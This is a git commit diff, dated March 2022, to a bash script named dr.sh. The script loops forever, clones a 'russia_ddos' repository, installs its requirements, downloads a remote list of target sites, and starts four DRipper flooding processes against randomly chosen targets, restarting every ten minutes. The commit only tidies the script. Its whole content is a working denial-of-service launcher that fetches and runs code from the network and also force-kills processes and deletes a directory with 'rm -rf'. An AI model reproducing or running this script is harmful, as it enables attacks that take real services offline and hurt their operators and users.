547d41eb1e0826bfda6a2eabb3e60b54671d3740
KarboDuck <53382906+KarboDuck@users.noreply.github.com>
2022-03-09 22:12:49 +0200

    Update dr.sh

--- dr.sh
+++ dr.sh
@@ -1,16 +1,12 @@
 #!/bin/bash
-#systemctl start docker
 
 while true
 do
-
 pkill -9 python3
 cd ~
 rm -rf russia_ddos
 git clone https://github.com/alexmon1989/russia_ddos.git
-cd russia_ddos
-pip install -r requirements.txt
-
+pip install -r russia_ddos/requirements.txt
 for i in $(seq 1 4)
 do
         site=$(curl https://raw.githubusercontent.com/KarboDuck/karbo-wiki/master/DRipper | cat | shuf -n 1)
@@ -19,9 +15,7 @@ do
         prot=$(echo $site | awk '{print $3}')
         echo $addr $port $prot
         python3 -u ~/russia_ddos/DRipper.py -l 2048 -s $addr -p $port -m $prot -t 50&
-#        docker run -t --rm alexmon1989/dripper:latest -l 2048 -s $addr -m $prot -p $port -t 50&
 done
 sleep 600
-#pkill -9 docker
 pkill -9 python3
 done
